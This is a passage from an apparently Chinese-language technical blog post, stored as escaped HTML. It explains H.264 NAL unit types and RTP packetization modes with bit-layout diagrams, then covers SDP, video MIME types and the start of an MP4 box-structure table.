&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;补充增强信息 (SEI)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;序列参数集/SPS&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;图像参数集/PPS&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;分割符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;序列结束符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;流结束符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;填充数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;13 – 23&lt;/td&gt;
&lt;td&gt;保留&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;24 – 31&lt;/td&gt;
&lt;td&gt;未定义&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1-23 是 H.264 的标准定义，24 以后 RTP 进行了专有扩展&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;      Type   Packet    Single NAL    Non-Interleaved    Interleaved
                       Unit Mode           Mode             Mode
      -------------------------------------------------------------

      0      undefined     ig               ig               ig
      1-23   NAL unit     yes              yes               no
      24     STAP-A        no              yes               no
      25     STAP-B        no               no              yes
      26     MTAP16        no               no              yes
      27     MTAP24        no               no              yes
      28     FU-A          no              yes              yes
      29     FU-B          no               no              yes
      30-31  undefined     ig               ig               ig
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1-23 单一时间数据包 (Single NAL unit packet)，一个rtp包中只包含一个nalu。&lt;/p&gt;
&lt;p&gt;24-25 单一时间组合包(Aggregation packet)，一个rtp包含多个同一时间nalu。&lt;/p&gt;
&lt;p&gt;26-27 多时间组合包(Aggregation packet)，一个rtp包含多个时间片的多个nalu。&lt;/p&gt;
&lt;p&gt;28-29 分片组合(Fragmentation unit)，多个rtp包才能组合成一个完整的nalu。&lt;/p&gt;
&lt;p&gt;#####打包封装:&lt;/p&gt;
&lt;p&gt;使用 RTP 打包时会用 RTP 头替换掉 NALU 中开始的 Start Code (00 00 00 01 或 00 00 01)&lt;/p&gt;
&lt;p&gt;打包举例，对于如下 NALU&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[00 00 00 01 67 42 A0 1E 23 56 0E 2F … ]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 RTP 打包成下面的内容：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[RTP Header] [67 42 A0 1E 23 56 0E 2F … ]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;几种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Single NAL unit packet：可以在一个网络包中传输整个 NALU&lt;/li&gt;
&lt;li&gt;Aggregation packet：可以在一个网络包中传输多个 NALU，又可以分为“单一时间组合包”和“多时间组合包”&lt;/li&gt;
&lt;li&gt;Fragmentation unit：无法在一个网络包中传输整个 NALU，可以理解成一个 NALU 长度超过 MTU 减去各种协议头（UDP/TCP/IP/RTP）的长度，需要把一个 NALU 拆分成多个 NAL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;单一时间数据包：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当nalu较小，一个rtp包即可传输时，可在单个rtp包中只包含一个nalu，进行发送。&lt;/p&gt;
&lt;p&gt;一个rtp中只包含一个nalu，rtp的负载如下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       0                   1                   2                   3
       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                          RTP Header                           |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |F|NRI|  type   |                                               |
      +-+-+-+-+-+-+-+-+                                               |
      |                                                               |
      |               Bytes 2..n of a Single NAL unit                 |
      |                                                               |
      |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                               :...OPTIONAL RTP padding        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;单一时间组合包：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;nalu较小的情况下，在同一时刻生成了多个nalu，可以使用该打包方式，将多个nalu封装在一个包中。webrtc中sps和pps通常打包在同一个rtp中。&lt;/p&gt;
&lt;p&gt;STAP-A 封装格式&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       0                   1                   2                   3
       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                          RTP Header                           |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |STAP-A NAL HDR |         NALU 1 Size           | NALU 1 HDR    |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                         NALU 1 Data                           |
      :                                                               :
      +               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |               | NALU 2 Size                   | NALU 2 HDR    |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                         NALU 2 Data                           |
      :                                                               :
      |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                               :...OPTIONAL RTP padding        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;STAP-A NAL HDR 中 nalu type取值为24。&lt;/p&gt;
&lt;p&gt;相对于单一数据包中，多了一个 NALU Size 字段，表示每个nalu的长度。&lt;/p&gt;
&lt;p&gt;STAP-B 封装格式&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       0                   1                   2                   3
       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                          RTP Header                           |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |STAP-B NAL HDR | DON                           | NALU 1 Size   |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      | NALU 1 Size   | NALU 1 HDR    | NALU 1 Data                   |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               +
      :                                                               :
      +               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |               | NALU 2 Size                   | NALU 2 HDR    |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                       NALU 2 Data                             |
      :                                                               :
      |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                               :...OPTIONAL RTP padding        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;STAP-B NAL HDR 中 nalu type取值为25。&lt;/p&gt;
&lt;p&gt;相对于STAP-A多了一个DON (decoding order number)字段，既解码顺序，而后续的每个nalu的解码顺序为DON累加1，既nalu 1 解码顺序为DON,而NALU2 为DON+1,NALU3 为(DON +1)+1，以此类推。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多时间组合包：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;nalu较小的情况下，在一个rtp包中封装多个不同时间戳的nalu。&lt;/p&gt;
&lt;p&gt;MTAP16&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       0                   1                   2                   3
       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                          RTP Header                           |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |MTAP16 NAL HDR |  decoding order number base   | NALU 1 Size   |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |  NALU 1 Size  |  NALU 1 DOND  |       NALU 1 TS offset        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |  NALU 1 HDR   |  NALU 1 DATA                                  |
      +-+-+-+-+-+-+-+-+                                               +
      :                                                               :
      +               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |               | NALU 2 SIZE                   |  NALU 2 DOND  |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |       NALU 2 TS offset        |  NALU 2 HDR   |  NALU 2 DATA  |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+               |
      :                                                               :
      |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                               :...OPTIONAL RTP padding        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;MTAP16 NAL HDR 中 nalu type取值为26。&lt;/p&gt;
&lt;p&gt;DONB(decoding order number base)表示解码顺序的基数值，DOND 表示与DONB的偏移值。&lt;/p&gt;
&lt;p&gt;NALU TS offset ，为nalu原始时间戳与 rtp包头中的timestap的偏移值。&lt;/p&gt;
&lt;p&gt;MTAP24&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       0                   1                   2                   3
       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                          RTP Header                           |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |MTAP24 NAL HDR |  decoding order number base   | NALU 1 Size   |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |  NALU 1 Size  |  NALU 1 DOND  |       NALU 1 TS offs          |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |NALU 1 TS offs |  NALU 1 HDR   |  NALU 1 DATA                  |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               +
      :                                                               :
      +               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |               | NALU 2 SIZE                   |  NALU 2 DOND  |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |       NALU 2 TS offset                        |  NALU 2 HDR   |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |  NALU 2 DATA                                                  |
      :                                                               :
      |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                               :...OPTIONAL RTP padding        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;MTAP24 NAL HDR 中 nalu type取值为27。&lt;/p&gt;
&lt;p&gt;MATP16与 MTAP24 的区别在于NALU TS offset 值存放空间不同，前者为16bit，而后者为24bit。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分片组合：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当使用udp传输rtp包时，由于一个udp的荷载最大为1480个字节，当一个nalu大于1480时，就需要将一个nalu分割为多个rtp包进行传输，具体的分割方式有以下两种。&lt;/p&gt;
&lt;p&gt;FU-A&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       0                   1                   2                   3
       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                          RTP Header                           |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      | FU indicator  |   FU header   |                               |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               |
      |                                                               |
      |                         FU payload                            |
      |                                                               |
      |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                               :...OPTIONAL RTP padding        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;FU-B&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;       0                   1                   2                   3
       0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                          RTP Header                           |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      | FU indicator  |   FU header   |               DON             |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-|
      |                                                               |
      |                         FU payload                            |
      |                                                               |
      |                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
      |                               :...OPTIONAL RTP padding        |
      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中 FU indicator&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;      +---------------+
      |0|1|2|3|4|5|6|7|
      +-+-+-+-+-+-+-+-+
      |F|NRI|  Type   |
      +---------------+
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;F: 1 bit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;forbidden_zero_bit，h264语法规定值为0。rtp封包中，当检测到值为1时，则表示该nalu中已出现错误。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NRI: 2 bits&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;nal_ref_idc, 当值为00时，表示后面的负载可以丢弃，并不会影响正常解码，当大于00时后面的该包丢弃会影响解码，不可丢弃。rtp封包中，该值也表示该数据包的重要性，11为重要性最高。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Type: 5bit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;rtp包中nalu type，可取值为28(FU-A)，29(FU-B)。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;FU header&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;      +---------------+
      |0|1|2|3|4|5|6|7|
      +-+-+-+-+-+-+-+-+
      |S|E|R|  Type   |
      +---------------+
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;S: 1 bit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;值为1表示该rtp包为nalu的开始。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;E: 1 bit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;值为1表示该rtp包为nalu的结束。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;R: 1 bit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;保留字段。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Type: 5bit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;表示h264中的nalu type 可取值1-23。&lt;/p&gt;
&lt;p&gt;从分片恢复 NALU header:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nal_unit_type = (fu_indicator &amp;amp; 0xe0) | (fu_header &amp;amp; 0x1f)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;一个全局的 NAL RTP 打包结构图如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/NAL-RTP.png&#34; alt=&#34;NAL-RTP&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NALU：主体数据打包进 RTP&lt;/li&gt;
&lt;li&gt;Slice Header: 包含分片类型、分片中的宏块类型、分片帧的数量以及对应的帧的设置和参数等信息&lt;/li&gt;
&lt;li&gt;Slice Data: 宏块信息&lt;/li&gt;
&lt;li&gt;宏块：宏块类型、预测类型、Coded Block Pattern、Quantization Parameter、像素的亮度和色度数据集等等信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;32sdp-isoiec-14496-1&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#32sdp-isoiec-14496-1&#34;&gt;
        #
    &lt;/a&gt;
    3.2.SDP (ISO/IEC 14496-1)
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;使用 SDP 传输 ISO/IEC 14496-1 定义的内容&lt;/p&gt;
&lt;h2 id=&#34;33mime-type&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#33mime-type&#34;&gt;
        #
    &lt;/a&gt;
    3.3.MIME type
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;互联网媒体类型 (Internet media type，也称为 MIME type），给互联网上传输的内容进行分类。&lt;/p&gt;
&lt;p&gt;MIME type 格式为：&amp;lt;类型&amp;gt;/&amp;lt;子类型&amp;gt;; [可选参数]&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;text/html; charset = UTF-8

video/mp4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以下是常用的视频类 MIME type：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;video/mpeg：MPEG-1视频文件&lt;/p&gt;
&lt;p&gt;video/mp4：MP4视频文件&lt;/p&gt;
&lt;p&gt;video/ogg：Ogg视频文件&lt;/p&gt;
&lt;p&gt;video/quicktime：QuickTime视频文件&lt;/p&gt;
&lt;p&gt;video/webm：WebM视频文件（基于Matroska基础）&lt;/p&gt;
&lt;p&gt;video/x-matroska：Matroska（多媒体封装格式）&lt;/p&gt;
&lt;p&gt;video/x-ms-wmv：Windows Media Video视频文件&lt;/p&gt;
&lt;p&gt;video/x-flv：Flash Video（FLV档）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;4mp4-第十四部分isoiec-14496-14&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4mp4-%e7%ac%ac%e5%8d%81%e5%9b%9b%e9%83%a8%e5%88%86isoiec-14496-14&#34;&gt;
        ##
    &lt;/a&gt;
    4.MP4: 第十四部分（ISO/IEC 14496-14）
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;MP4 文件由可以嵌套的 box 组成，每个 box 有 header 和 data，header 定义 box 的类型和大小，data 包含数据或者子 box。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/mp4-box.png&#34; alt=&#34;mp4 box&#34;&gt;&lt;/p&gt;
&lt;p&gt;一个典型的视频文件格式如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/CV/video-media-container/mp4-file-format.png&#34; alt=&#34;mp4 file format&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;3&lt;/th&gt;
&lt;th&gt;4&lt;/th&gt;
&lt;th&gt;5&lt;/th&gt;
&lt;th&gt;6&lt;/th&gt;
&lt;th&gt;7&lt;/th&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ftyp&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;描述文件类型、版本等信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mdat&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;Media Data 媒体数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;嵌套 box&lt;/td&gt;
&lt;td&gt;Movie box，用来存放每个媒体轨道的描述信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;mvhd&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;Movie Header box，记录整个媒体文件信息，如创建时间、修改时间、时间度量标尺、时长等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;udta&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;嵌套 box&lt;/td&gt;
&lt;td&gt;User Data box，用户自定义信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;嵌套 box&lt;/td&gt;
&lt;td&gt;Track box，记录每个轨道的信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;tkhd&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;Track Header box，轨道的头信息，如创建/修改时间、时长、画面宽度/高度等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;嵌套 box&lt;/td&gt;
&lt;td&gt;Media box，媒体信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;mdhd&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;Media Header box，记录创建时间、时长等信息，&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;hdlr&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;Handler Reference box，媒体播放过程信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;嵌套 box&lt;/td&gt;
&lt;td&gt;Media Information box&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;vmhd&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;视频媒体头信息，smhd：针对音频&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;嵌套 box&lt;/td&gt;
&lt;td&gt;Sample Table box，媒体数据的索引信息，找到视频的帧数据可以从这里获取&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;stsd&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;嵌套 box&lt;/td&gt;
&lt;td&gt;sample description, 给出视频、音频的编码、宽高、音量等信息，以及每个sample中包含多少个frame&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;stco&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;chunk offset, chunk（一个chunk 包含多个 sample，一个 sample 对应一帧） 在文件中的偏移&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moov&lt;/td&gt;
&lt;td&gt;trak&lt;/td&gt;
&lt;td&gt;mdia&lt;/td&gt;
&lt;td&gt;minf&lt;/td&gt;
&lt;td&gt;stbl&lt;/td&gt;
&lt;td&gt;stsc&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;数据 box&lt;/td&gt;
&lt;td&gt;sample-to-chunk, chunk 中包含 sample 的数量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
